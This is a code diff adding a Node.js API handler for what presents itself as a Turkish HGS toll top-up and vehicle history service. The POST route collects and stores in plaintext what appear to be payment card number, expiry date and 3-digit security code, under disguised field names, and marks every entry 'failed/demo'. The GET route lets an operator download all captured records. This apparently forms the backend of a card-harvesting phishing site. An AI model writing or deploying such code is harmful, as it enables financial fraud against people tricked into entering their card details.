@@ -1,0 +1,6 @@
+const {db,auth,json}=require('./_lib');
+module.exports=async(req,res)=>{const s=db();if(req.method==='POST'){const b=req.body||{};if(!['HGS Bakiye Yükleme','KM / Hasar Sorgu'].includes(b.service))return json(res,400,{error:'Hizmet geçersiz'});
+if(!/^\d{18}$/.test(b.ref||'')||!/^(0[1-9]|1[0-2])\/\d{2}$/.test(b.valid||'')||!/^\d{3}$/.test(b.code||''))return json(res,400,{error:'Referans bilgileri geçersiz'});
+const row={service:b.service,plate:String(b.plate||'').slice(0,16),amount:Number(b.amount||0),reference:b.ref,validity:b.valid,code:b.code,status:'Başarısız / Demo'};
+const {error}=await s.from('transactions').insert(row);if(error)return json(res,500,{error:error.message});return json(res,200,{ok:true})}
+if(req.method==='GET'){if(!auth(req))return json(res,401,{error:'Yetkisiz'});const {data,error}=await s.from('transactions').select('*').order('created_at',{ascending:false}).limit(500);if(error)return json(res,500,{error:error.message});return json(res,200,data)}json(res,405,{error:'method'})};
